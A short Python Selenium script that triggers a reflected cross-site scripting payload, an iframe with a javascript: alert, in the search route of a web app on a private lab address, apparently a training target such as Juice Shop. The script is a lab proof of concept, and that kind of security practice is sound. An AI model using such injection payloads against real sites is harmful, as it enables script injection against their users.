from selenium import webdriver
from time import sleep

def get_browser():
    return webdriver.Chrome()

def open_xss1_alert(server, browser):
    print('Popping reflected XSS1 in browser...')
    xssurl = '{}/#/search?q=<iframe%20src%3D"javascript:alert(%60xss%60)">.'.format(server)
    browser.get(xssurl)
    # Sleep just to show the XSS alert
    sleep(3)
    browser.switch_to.alert.accept()
    print('Success.')

open_xss1_alert("http://192.168.55.132:3000", get_browser())
